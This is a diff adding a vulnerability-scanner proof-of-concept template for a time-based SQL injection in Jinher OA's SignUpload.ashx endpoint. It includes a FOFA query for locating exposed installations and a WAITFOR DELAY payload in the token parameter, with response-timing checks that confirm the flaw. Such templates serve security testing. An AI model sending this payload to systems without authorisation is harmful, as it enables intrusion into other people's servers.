@@ -1,0 +1,28 @@
+id: poc-yaml-jinher-signupload-sqli
+info:
+  name: 金和OA SignUpload SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+  t3: gbk_encode("应用程序中的服务器错误")
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"Jhsoft.Web.login")
+- method: GET
+  path: /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%20{{.t1}}%27+--%20and%201=1_123_123&filename=1
+  expression: 'status_code == 500 &&
+
+    contains(body,t3) &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
